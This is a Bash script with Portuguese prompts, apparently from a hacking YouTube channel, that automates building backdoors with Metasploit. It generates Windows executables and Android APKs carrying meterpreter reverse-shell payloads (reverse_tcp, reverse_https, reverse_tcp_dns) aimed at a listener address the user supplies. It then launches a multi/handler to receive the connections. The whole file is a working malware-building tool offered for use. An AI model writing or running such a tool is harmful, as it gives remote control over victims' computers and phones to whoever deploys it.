#!/bin/bash
# teste de script para automatizar a criacao de uma backdoor

echo
echo -e "\033[01;31m" 
echo "          _    _ _______ ____  __  __       _______ _____ _____ "
sleep 0.1
echo "     /\  | |  | |__   __/ __ \|  \/  |   /\|__   __|_   _/ ____|"
sleep 0.1
echo "    /  \ | |  | |  | | | |  | | \  / |  /  \  | |    | || |     "
sleep 0.1
echo "   / /\ \| |  | |  | | | |  | | |\/| | / /\ \ | |    | || |     "
sleep 0.1
echo "  / ____ \ |__| |  | | | |__| | |  | |/ ____ \| |   _| || |____ "
sleep 0.1
echo " /_/    \_\____/   |_|  \____/|_|  |_/_/    \_\_|  |_____\_____|"
                                                                
                                                                
 
sleep 0.1
echo "=========================================by=Bacon==============================="                                                                                                   
echo "                               www.youtube.com/baconhacking"
echo 
echo "Para sair pressione CTRL + C"

dir='/usr/share/metasploit-framework'
if [ -e $dir ]
then
	echo
	echo
	echo -e "\033[01;32m [+]\033[01;37m Metasploit encontrado"
else
	echo
	echo
	echo -e  "\033[01;31m [-]\033[01;37m Metasploit nao encontrado" ; exit 0
fi
echo
echo
echo -e "   =======================\033[01;32mPayloads disponiveis:\033[01;37m==============================="
echo "   |                                                                         |"
echo -e "   |    \033[01;32m [+]\033[01;37m Windows                                                         |"
echo "   | 								             |"
echo -e "   |    \033[01;33m [1]\033[01;37m windows/meterpreter/reverse_tcp  				     |"
echo -e "   |    \033[01;33m [2]\033[01;37m windows/meterpreter/reverse_https 				     |"
echo -e "   | 	\033[01;33m [3]\033[01;37m windows/meterpreter/reverse_tcp_dns		             |"
echo "   |                                                                         |"
echo -e "   |    \033[01;32m [+]\033[01;37m Android                                                         |"
echo "   |                                                                         |"
echo -e "   |    \033[01;33m [4]\033[01;37m android/meterpreter/reverse_tcp                                 |"
echo -e "   |    \033[01;33m [5]\033[01;37m android/meterpreter/reverse_https                               |"
echo "   |                                                                         |"
echo "   |                                                                         |"
echo "   |                                                                         |"
echo "   |                                                                         |"
echo "   |                                                                         |"
echo "   |_________________________________________________________________________|"
echo
echo
echo -e "\033[01;33m DIGITE O NUMERO DO PAYLOAD DESEJADO:"
echo -ne "\033[01;32m automatic >\033[01;31m" && read payload
if [ $payload -gt 5 ]
then
	echo "Payload invalido" ; exit 0
elif [ $payload -lt 1 ]
then
	echo "Payload invalido" ; exit
fi

echo -e "\033[01;33m DIGITE O IP DO HOST QUE VAI RECEBER A CONEXAO:"
echo -ne "\033[01;32m automatic >\033[01;31m" && read lhost
echo -e "\033[01;33m DIGITE A PORTA PARA A CONEXAO:"
echo -ne "\033[01;32m automatic >\033[01;31m" && read lport
echo -e "\033[01;33m QUAL SERA O NOME DO ARQUIVO MALICIOSO?"
echo -ne "\033[01;32m automatic >\033[01;31m" && read backdoor
echo
echo
if [ $payload -eq 1 ]
then
	cd arquivos
	echo "Criando a backdoor..." ; msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $backdoor.exe 2>/dev/null
	payload='windows/meterpreter/reverse_tcp'
elif [ $payload -eq 2 ]
then
	cd arquivos
	echo "Criando a backdoor..." ; msfvenom -p windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f exe > $backdoor.exe 2>/dev/null
        payload='windows/meterpreter/reverse_https'
elif [ $payload -eq 3 ]
then
	cd arquivos
	echo "Criando a backdoor..." ; msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=$lhost LPORT=$lport -f exe > $backdoor.exe 2>/dev/null
	payload='windows/meterpreter/reverse_tcp_dns'
elif [ $payload -eq 4 ]
then
	cd arquivos
	echo "Criando o apk malicioso..." ; msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $backdoor.apk 2>/dev/null
	payload='android/meterpreter/reverse_tcp'
elif [ $payload -eq 5 ]
then
	cd arquivos
	echo "Criando o apk malicioso..." ; msfvenom -p android/meterpreter/reverse_https LHOST=$lhost LPORT=$lport R > $backdoor.apk 2>/dev/null
	payload='android/meterpreter/reverse_https'
fi
echo
echo
echo -ne "\033[01;32m Arquivo criado! Deseja configurar o handler? (y/n):" && read resposta
echo
echo
if [ $resposta == "y" ]
then
	msfconsole -q -x "use multi/handler ; set PAYLOAD $payload ; set LHOST $lhost ; set LPORT $lport ; exploit"
elif [ $resposta == "n" ]
then
	echo "Obrigado por usar a ferramenta!"
        exit 0
elif [ $resposta != "y" ]
then
	exit 0
elif [ $resposta != "n" ]
then
	exit 0
fi

